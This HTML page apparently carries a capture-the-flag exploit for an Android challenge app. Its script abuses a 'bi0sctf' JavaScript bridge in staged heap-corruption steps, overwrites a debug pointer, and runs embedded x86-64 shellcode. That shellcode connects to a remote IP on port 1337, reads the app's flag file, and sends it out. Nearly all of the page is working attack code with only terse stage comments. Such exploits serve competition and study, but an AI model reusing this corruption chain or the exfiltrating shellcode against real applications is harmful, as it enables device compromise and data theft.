<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>babu</title>
</head>
<body>
    <p>bob</p>
    <script>document.write("JS WORKS ? test")</script>
    </body><script>console.log(1234)</script>
    <script type="text/javascript">
        function p64(data){ 
            const byteArray = new Uint8Array([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
            let i=0
            while(data > 0){
                byteArray[i] = data&0xff
                data = (data - data%256) / 256
                i = i+1
            }
            return String.fromCharCode.apply(String, byteArray)
        }
        function fin(data){
            const byte_array = []
            for (const character of data) {
                const code = character.charCodeAt(0)
                byte_array.push(code)
            }
            return byte_array
        }
        function u64(data){ 
            return parseInt(data.match(/../g).reverse().join(''), 16)
        }
        pass = "50133tbd5mrt1769"

        // Stage1 - Get the Heap address.
        let h1 = bi0sctf.secure_talloc(pass, 0x20, fin(p64(0) + p64(0) + p64(0x31)))
        let heap = h1-64

        // stage2 - Get allocation on meta data at heap start. pointers.
        let a = bi0sctf.secure_talloc(pass, 0x20, fin("BBBB"))
        let b = bi0sctf.secure_talloc(pass, 0x90, fin("BBBB"))
        console.log("Starting Exploit");
        bi0sctf.secure_tree(pass, a) 
        bi0sctf.secure_tree(pass, heap+0x58)   
        bi0sctf.secure_talloc(pass, 0x20, fin(p64(0) + p64(0) + p64(0x41) + p64(heap+16)))

        //intermidiate step - later use.
        console.log("reached intermidiate")
        bi0sctf.secure_talloc(pass, 0x20, fin(p64(0) + p64(heap+0x28) + p64(0x80)))

        console.log("Stage 3 - middle")
        // stage3 middle step - setup
        bi0sctf.secure_tree(pass, b)
        let yello = bi0sctf.secure_talloc(pass, 0x80, fin(p64(0) + p64(0) + p64(0x30) + p64(0x41410008) + p64(0x41410008) + "XXXXXXXX" ))
        bi0sctf.secure_tree(pass, heap+16)
        bi0sctf.secure_talloc(pass, 0x20, fin(p64(yello+24) + p64(0)))
        bi0sctf.secure_talloc(pass, 0x20, [])
        
        console.log("Stage - 3")
        // stage3 - Overwrite the run debug to get the pointer to exec region. 
        bi0sctf.secure_tree(pass, heap+16)
        bi0sctf.secure_talloc(pass, 0x20, fin(p64(0x41410008+16)))
        let shellcode = "\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x31\xd2\x0f\x05\x49\x89\xc1\x6a\x2a\x58\x4c\x89\xcf\x52\x52\x68\x62\x46\x19\x96\x66\x68\x05\x39\x66\x6a\x02\x48\x89\xe6\x48\x83\xc2\x10\x0f\x05\xb8\x02\x00\x00\x00\x48\x8d\x3c\x25\x6f\x10\x40\x00\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05\x48\x89\xc7\xb8\x00\x00\x00\x00\x48\x89\xe6\xba\x50\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x00\x4c\x89\xcf\x48\x89\xe6\xba\x50\x00\x00\x00\x0f\x05\x6a\x3c\x58\x0f\x05\x2f\x64\x61\x74\x61\x2f\x64\x61\x74\x61\x2f\x62\x69\x30\x73\x63\x74\x66\x2e\x61\x6e\x64\x72\x6f\x69\x64\x2e\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x2f\x66\x6c\x61\x67"
        let shell = bi0sctf.secure_talloc(pass, 0x100 , fin(shellcode))

        console.log("Stage - 4")
        // stage4 - overwrite the debugger with the address of shellcode
        bi0sctf.secure_tree(pass, heap+16)
        bi0sctf.secure_talloc(pass, 0x20, fin(p64(0) + p64(0) + p64(0) +p64(0x41410018)))

        console.log("Stage - 5")
        // call the shellcode
        bi0sctf.secure_talloc(pass, 0x20, fin(p64(69)))

    </script>
</body>
</html>